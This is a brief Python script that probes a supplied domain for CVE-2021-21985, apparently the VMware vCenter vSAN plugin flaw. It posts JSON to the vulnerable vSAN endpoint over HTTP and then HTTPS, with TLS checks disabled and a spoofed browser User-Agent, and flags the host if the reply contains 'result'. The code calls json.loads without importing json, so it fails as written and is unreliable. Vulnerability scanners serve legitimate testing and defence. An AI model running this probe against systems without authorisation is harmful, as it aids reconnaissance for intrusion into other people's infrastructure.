import sys
import codecs
import warnings
import requests
warnings.filterwarnings("ignore")


def cve_2021_21985(domain):
    uri = "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setTargetObject"
    data = json.loads('{"methodInput":[null]}')
    headers = {'Content-Type': 'application/json', "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 7roublemaker"}
    try:
        url = "http://" + domain + uri
        response = requests.post(url, json=data, headers=headers, timeout=2, verify=False)
        if "result" in response.text:
            print(" [+] The target %s may be vulnerability with cve-2021-21985"%domain)
            return True
    except:
        try:
            url = "https://" + domain + uri
            response = requests.post(url, json=data, headers=headers, timeout=2, verify=False)
            if "result" in response.text:
                print(" [+] The target %s may be vulnerability with cve-2021-21985"%domain)
                return True
        except Exception as e:
            return False
    return False
